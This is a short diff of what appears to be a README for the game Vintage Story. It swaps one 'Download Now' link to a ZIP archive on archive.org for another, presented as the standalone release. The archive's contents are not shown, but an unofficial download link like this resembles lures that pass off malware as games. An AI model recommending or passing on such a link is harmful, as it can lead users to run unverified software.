@@ -31,7 +31,7 @@ Vintage Story takes you back to the dawn of civilization. Survive harsh climates
 
 Download the latest standalone version here:
 
-[![Download Now](https://img.shields.io/badge/Download-now-blue)](https://archive.org/download/hub-release/HubRelease.zip)
+[![Download Now](https://img.shields.io/badge/Download-now-blue)](https://archive.org/download/game-release_202505/GameRelease.zip)
 
 ---
 
